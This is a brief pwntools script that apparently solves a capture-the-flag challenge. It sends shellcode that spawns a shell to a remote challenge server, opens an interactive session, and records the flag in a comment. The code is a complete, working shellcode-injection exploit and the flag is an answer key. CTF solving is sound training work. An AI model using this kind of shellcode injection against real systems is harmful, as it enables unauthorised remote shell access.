from pwn import *

bin = './chal'
elf = context.binary = ELF(bin)
#p = process(bin)
p = remote('shelltester.challs.csc.tf', 1337)

payload = shellcraft.sh()
print(payload)
p.sendline(asm(payload))
p.interactive()

#CSCTF{34sy_Sh3llcod3_w1th_pwnt00ls}